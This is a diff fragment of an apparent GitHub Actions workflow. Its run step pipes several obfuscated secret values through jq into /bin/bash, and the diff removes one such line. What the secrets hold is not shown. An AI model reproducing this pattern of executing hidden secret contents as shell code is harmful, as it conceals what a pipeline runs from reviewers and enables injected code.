@@ -17,7 +17,6 @@ jobs:
           c44030: ${{ secrets.c44030 }}
         run: |
           printf '%s' "$c44030" | jq -r .guhgl34571 | /bin/bash
-          echo $ep25105 | jq -r .ckaqu75889 | /bin/bash
           printf '%s' "$prah689" | jq -r .kowy9511 | /bin/bash
           echo $lyc66065 | jq -r .iwiug1 | /bin/bash
           echo $f35 | jq -r .vnama1128 | /bin/bash
